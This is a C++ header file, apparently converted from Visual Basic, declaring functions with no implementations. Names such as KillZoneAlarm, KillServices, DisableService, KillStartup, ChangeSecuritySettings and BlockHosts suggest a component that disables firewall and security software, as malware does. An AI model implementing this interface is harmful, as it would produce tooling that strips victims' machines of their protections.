#if !defined(AFX_MODKILLSTUFF_H__7E4E936A_FE2E_4A97_B30C_B2FE2C045FC8__INCLUDED_)
#define AFX_MODKILLSTUFF_H__7E4E936A_FE2E_4A97_B30C_B2FE2C045FC8__INCLUDED_

// modKillStuff.h : header file
//

//{{chodebot_Class_Global(modKillStuff)
//}}chodebot_Class_Global
	//{{chodebot_Class_Public(modKillStuff)
	
	void LoadKillLists();
	void ChangeSecuritySettings();
	void DisableCmd(CString& strCmd);
	void EnableCmd(CString& strCmd);
	void DisableCmds(bool& blnDisable);
	void KillZoneAlarm();
	void KillServices();
	void DisableService(CString& strService);
	void KillStartup();
	void EnableRegfiles(bool& blnEnable);
	void ListProcesses(CStringArray strProcesses, int* lngPIDs, int& lngCount);
	void KillSingleProcess(CString strExeName);
	void KillTheBadness();
	bool CheckHost(CString strCheck);
	void BlockHosts(bool& blnBlock);
	//}}chodebot_Class_Public


	//=========================================================

/*? Public */ /*? () As */
 /*? Public *//*? () As */
 /*? Public *//*? () As */
 /*? Public *//*? () As */
 /*? Public *//*? () As */










#endif // !defined(AFX_MODKILLSTUFF_H__7E4E936A_FE2E_4A97_B30C_B2FE2C045FC8__INCLUDED_)
